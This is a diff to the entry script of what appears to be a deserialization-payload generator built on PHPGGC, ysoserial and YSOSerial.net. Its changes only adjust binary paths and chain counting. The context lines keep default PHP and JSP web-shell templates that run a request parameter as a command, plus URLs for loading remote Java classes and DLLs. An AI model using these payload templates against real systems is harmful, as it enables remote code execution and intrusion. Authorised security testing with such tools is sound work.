@@ -96,15 +96,15 @@ if __name__ == '__main__':
 
     # php specific
     phpggc_group = parser.add_argument_group('phpggc')
-    phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./phpggc/phpggc")
+    phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./bin/phpggc/phpggc")
     phpggc_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
     phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
     phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
 
     # java specific
     ysoserial_group = parser.add_argument_group('ysoserial')
-    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./jre1.8.0_431/bin/java")
-    ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial-all.jar")
+    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
+    ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
     ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
     ysoserial_group.add_argument('--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
     ysoserial_group.add_argument('--java-classname', help="Java class name used for remote dynamic loading", default="Main")
@@ -120,7 +120,7 @@ if __name__ == '__main__':
     net_group.add_argument('--csharp-remote-dll', help="URL or SMB path to make the chain load remotely a DLL and execute it", default="https://%%domain%%/%%chain_id%%.dll")
     net_group.add_argument('--csharp-net-remoting', help="URL .Net remoting proxy, transports tcp, http, ipc are supported (https://github.com/codewhitesec/RogueRemotingServer>)", default="http://%%domain%%/%%chain_id%%")
     net_group.add_argument('--ysoserial-net-formatters', help="Only use this list of YSOSerial.net formatters, comma-separated")
-    net_group.add_argument('--ysoserial-net-path', help="Full path to YSOSerial.net exe", default="./Release/ysoserial.exe")
+    net_group.add_argument('--ysoserial-net-path', help="Full path to YSOSerial.net exe", default="./bin/Release/ysoserial.exe")
     net_group.add_argument('--ysoserial-net-options', help="Options to pass to YSOSerial.net command line", default="")
     net_group.add_argument('--wine-path', help="Full path to wine bin (linux only)", default="wine")
 
@@ -167,6 +167,7 @@ if __name__ == '__main__':
         if args.list:
             for chain in chains:
                 print(chain['description'])
+            count = count + len(chains)
             continue
         
         else:
@@ -194,10 +195,12 @@ if __name__ == '__main__':
             # generate payloads for each language
             count = count + generator.generate(finalChains)
 
-    if not args.list:
+    if args.list:
+        logging.info(f"Listed {count} gadget chains")
+    else:
         logging.info(f"Generated {count} payloads to {args.output}")
 
-        logging.info(f"Happy hunting!")
+    logging.info(f"Happy hunting!")
 
 
 
